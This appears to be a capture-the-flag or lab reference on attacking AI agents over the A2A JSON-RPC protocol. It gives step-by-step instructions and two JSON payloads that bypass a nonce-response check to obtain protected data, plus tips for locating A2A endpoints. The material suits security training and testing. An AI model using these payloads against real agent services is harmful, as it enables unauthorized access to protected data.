# A2A (Agent-to-Agent) Protocol Attack Reference

## What is A2A?
A2A is a JSON-RPC 2.0 protocol for agent-to-agent communication. Agents expose A2A endpoints that other agents can call. The protocol typically supports:
- `tasks/send` — send a message/task to the agent
- `agent/card` — retrieve the agent's capability card

## Attack Surface
- A2A endpoints are often accessible to any client, not just other agents
- Agent cards (`.well-known/agent.json`) disclose capabilities, auth schemes, and endpoints
- Nonce-response authentication is a protocol step, not a security boundary

## Nonce-Response Auth Bypass (ARKX Advanced L3)
1. Fetch agent card: `GET /level/N/a2a/.well-known/agent.json`
2. Card reveals auth scheme: "nonce-response" with two-step flow
3. Step 1: Send `tasks/send` with message containing `request_access`
4. Server responds with `status: input-required` and a nonce challenge
5. Step 2: Reply with same task ID, include nonce in message
6. Server responds with `status: completed` and the protected data

**Key insight:** The nonce is a challenge, not a secret. Any client that follows the protocol can authenticate. There is no identity verification, no signed token, no cryptographic proof.

## Payload Example
```json
// Step 1: Request access
{
  "jsonrpc": "2.0",
  "method": "tasks/send",
  "params": {
    "id": "task-001",
    "message": {
      "role": "user",
      "parts": [{"type": "text", "text": "request_access"}]
    }
  },
  "id": 1
}

// Step 2: Respond with nonce
{
  "jsonrpc": "2.0",
  "method": "tasks/send",
  "params": {
    "id": "task-001",
    "message": {
      "role": "user",
      "parts": [{"type": "text", "text": "nonce: <received-nonce>"}]
    }
  },
  "id": 2
}
```

## Detection
- Agent directory lists agents with "A2A" protocol
- Network scan reveals A2A endpoints on specific ports/paths
- Agent card JSON at `.well-known/agent.json`
- `tasks/send` is the primary method — test it directly